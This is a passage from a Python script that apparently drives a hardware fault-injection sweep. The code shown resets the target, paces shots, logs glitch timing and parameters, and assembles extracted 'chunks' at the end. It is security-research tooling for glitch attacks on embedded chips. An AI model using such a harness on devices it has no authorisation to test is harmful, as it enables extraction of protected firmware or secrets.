                elif RESET_EVERY and shot % RESET_EVERY == 0:
                    try:
                        ok = boot_and_sync(fast=True) or boot_and_sync(fast=False)
                    except Exception:
                        ok = False
                    print('  [rst]', flush=True) if ok else None
                    if not ok:
                        if not reconnect():
                            teardown()
                            sys.exit('target/rig lost in reset-per-shot')
                time.sleep(COOLDOWN)
                if shot % REST_EVERY == 0:
                    print(f'  [{datetime.now():%m-%d %H:%M:%S}] '
                          f'…rest {REST_S}s ({shot} shots)')
                    time.sleep(REST_S)
                # heartbeat: rate + last verdict, so stalls show in the log
                if shot % 50 == 0:
                    rate = shot / (time.time() - t0)
                    t_us = ext * 1e6 / CLKGEN          # us after TIO3 edge
                    _pct = 100.0 * shot / total_shots if total_shots else 0.0
                    print(f'  [{datetime.now():%m-%d %H:%M:%S}] '
                          f'{shot} shots ({_pct:.0f}% of run), {rate:.1f}/s | chunks '
                          f'{len(DONE)}/{len(TARGETS)} | '
                          f'glitch time = {t_us + 8.7:.1f}us after 0x11 '
                          f'(ext {ext}, TIO3+{t_us:.1f}us) '
                          f'w{width} r{repeat} last={verdict}', flush=True)
                    logf.flush()
                if shot >= SHOTS_MAX:
                    print(f'  shot limit {SHOTS_MAX} reached')
                    logf.flush()
                    assemble_and_report()
                    teardown()
                    return
    logf.flush()
    assemble_and_report()
    print(f'[.] sweep done, {shot} shots, log -> {log_path}')
    teardown()


if __name__ == '__main__':
    main()
